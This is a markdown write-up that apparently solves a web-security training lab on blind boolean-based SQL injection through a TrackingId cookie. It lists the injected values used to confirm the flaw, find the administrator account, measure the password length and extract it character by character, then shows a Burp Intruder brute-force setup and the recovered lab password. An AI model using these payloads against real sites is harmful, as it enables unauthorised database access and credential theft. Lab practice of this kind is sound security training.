# Problem

![image](https://github.com/user-attachments/assets/ceed0dcb-2818-4eea-a02f-5c4799d80bfc)

# Solution

Start with **BurpSuite** and intercept the request, looking for the _tracking id_ cookie.

![image](https://github.com/user-attachments/assets/40a9db98-7833-4bb5-a369-fd96dc670cfc)

That in particular.

Then, run the following commands:

```
TrackingId=XrqN3VQk3nJs1nXc' AND '1'='1 // Verify that SQLi works
TrackingId=XrqN3VQk3nJs1nXc' AND '1'='2 // Verify it works, but this time no response message
TrackingId=XrqN3VQk3nJs1nXc' AND (SELECT 'a' FROM users LIMIT 1)='a // Verify users table is there
TrackingId=XrqN3VQk3nJs1nXc' AND (SELECT 'a' FROM users WHERE username='administrator')='a //Verify that admin is there
TrackingId=XrqN3VQk3nJs1nXc' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>[1,2,3,...20])='a //Verify password length
TrackingId=XrqN3VQk3nJs1nXc' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a //Verify character is at that position in password
```

Take note of the last command, that's the payload we'll use to bruteforce this.

Speaking of, send the request to _Intruder_ and do the following:

**Intruder Presets:**

![image](https://github.com/user-attachments/assets/f71c23c8-b63f-448e-9aee-3c63f91dc778)

**Payloads:**

```
Payload 1: [1-20]
Payload 2: [a-z, 0-9]
```

**Intruder Results**

![image](https://github.com/user-attachments/assets/3bd995b3-d6c2-4ee1-a04d-03f704783cb5)

**Username: administrator**

**Password: a2k8q5haz214i3smm5m1**
